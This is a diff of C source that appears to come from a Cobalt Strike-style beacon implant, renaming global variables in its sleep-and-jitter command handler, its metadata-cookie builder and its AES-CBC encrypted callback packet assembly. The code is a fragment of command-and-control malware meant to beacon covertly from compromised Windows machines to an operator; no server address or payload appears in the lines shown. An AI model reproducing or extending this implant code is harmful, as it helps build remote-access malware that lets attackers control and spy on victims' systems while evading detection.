@@ -1,24 +1,17 @@
-#define _TIMESPEC_DEFINED  // 防止 windows.h 重复定义 timespec
-#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include "Command.h"
 #include "Http.h"
 #pragma warning(disable:4996)
 
-extern int SleepTime;
-extern int Counter;
-extern unsigned char aeskey[16];
-extern int clientID;
-
-VOID CmdChangSleepTimes(unsigned char* commandBuf, size_t commandBuflen) {
+VOID CmdChangSleepTimes(unsigned char* command, size_t command_length) {
     datap parser;
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
 
-    SleepTime = BeaconDataInt(&parser);
-	jitter = BeaconDataInt(&parser);
-    if (jitter <= 0 || jitter > 99)
-        jitter = 0;
-	jitter = (SleepTime * jitter) / 100;
+    g_sleeptime = BeaconDataInt(&parser);
+	g_jitter = BeaconDataInt(&parser);
+    if (g_jitter <= 0 || g_jitter > 99)
+        g_jitter = 0;
+	g_jitter = (g_sleeptime * g_jitter) / 100;
 }
 
 VOID FreeEncryptMetadataResult(EncryptMetadataResult* r) {
@@ -46,7 +39,7 @@ wchar_t* makeMetaData() {
         return NULL;
     }
 
-    size_t headers_length = strlen(metadata_header) + strlen(metadata_prepend);
+    size_t headers_length = strlen(g_metadata_header) + strlen(g_metadata_prepend);
 
     unsigned char* headerStart = (unsigned char*)malloc(headers_length + 1);
     if (!headerStart) {
@@ -55,8 +48,8 @@ wchar_t* makeMetaData() {
         return NULL;
     }
 
-    memcpy(headerStart, metadata_header, strlen(metadata_header));
-    memcpy(headerStart + strlen(metadata_header), metadata_prepend, strlen(metadata_prepend));
+    memcpy(headerStart, g_metadata_header, strlen(g_metadata_header));
+    memcpy(headerStart + strlen(g_metadata_header), g_metadata_prepend, strlen(g_metadata_prepend));
     headerStart[headers_length] = '\0';
 
     size_t cookieLen = strlen(headerStart) + strlen(baseEncodeMetadata);
@@ -126,7 +119,7 @@ static BOOL append_data(unsigned char** buf, size_t* buf_length, size_t* buf_cap
 }
 
 unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, size_t* msg_length) {
-    Counter += 1;
+    g_counter += 1;
 
     // 初始缓冲区容量
     size_t buf_capacity = 1024; 
@@ -137,9 +130,9 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
         return NULL;
     }
 
-    // 写入 Counter（大端 4 Byte）
+    // 写入 g_counter（大端 4 Byte）
     uint8_t counter_be[4];
-    PutUint32BigEndian(counter_be, (uint32_t)Counter);
+    PutUint32BigEndian(counter_be, (uint32_t)g_counter);
 
     if (!append_data(&buf, &buf_length, &buf_capacity, counter_be, 4)) {
         fprintf(stderr, "append_data failed for counter_big_endian\n");
@@ -181,7 +174,7 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
     size_t cipher_len = 0;
 
     // AES CBC 加密（输出包含 16 字节 IV + ciphertext）
-    unsigned char* cipher_buf = AesCBCEncrypt(buf, aeskey, buf_length, &cipher_len);
+    unsigned char* cipher_buf = AesCBCEncrypt(buf, g_aeskey, buf_length, &cipher_len);
     free(buf);
 
     if (!cipher_buf) {
